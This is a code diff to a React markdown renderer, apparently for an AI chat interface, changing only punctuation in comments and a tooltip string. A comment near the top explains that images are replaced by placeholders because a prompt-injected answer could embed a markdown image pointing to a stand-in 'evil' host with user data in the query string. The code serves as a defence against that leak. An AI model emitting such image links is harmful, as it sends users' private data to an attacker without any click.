@@ -60,7 +60,7 @@ const components: Components = {
     ),
 
     // Never an <img>. Rendering one fetches its URL with no click, and a
-    // prompt-injected answer can write `![](https://evil/?d=<your data>)` —
+    // prompt-injected answer can write `![](https://evil/?d=<your data>)`,
     // the request itself is the leak. A labelled placeholder instead, opened
     // in the browser only if you choose to. A span rather than a link, since
     // an image can sit inside a link and links can't nest.
@@ -70,7 +70,7 @@ const components: Components = {
             <span
                 role="link"
                 tabIndex={0}
-                title={url ? `Image not loaded — open ${url}` : "Image not loaded"}
+                title={url ? `Image not loaded. Open ${url}` : "Image not loaded"}
                 onClick={(e) => {
                     e.preventDefault();
                     e.stopPropagation();
@@ -109,8 +109,8 @@ const components: Components = {
 
     pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
 
-    // Tables are the most likely thing to exceed 800px, so the wrapper — not
-    // the page — takes the horizontal scroll.
+    // Tables are the most likely thing to exceed 800px, so the wrapper, not
+    // the page, takes the horizontal scroll.
     table: ({ children }) => (
         <div className="my-2 overflow-x-auto scrollbar-thin-shadcn rounded-lg border border-line-080">
             {/* min-w-full, not w-full: w-full pinned the table to the wrapper so
@@ -147,7 +147,7 @@ const components: Components = {
  * A fenced block with its own copy button.
  *
  * The text is read off the rendered DOM rather than reassembled from React
- * children — children are a nested tree of elements, and flattening them back
+ * children, children are a nested tree of elements, and flattening them back
  * to source drops newlines. The DOM already holds exactly what's on screen.
  */
 function CodeBlock({ children }: { children: ReactNode }) {
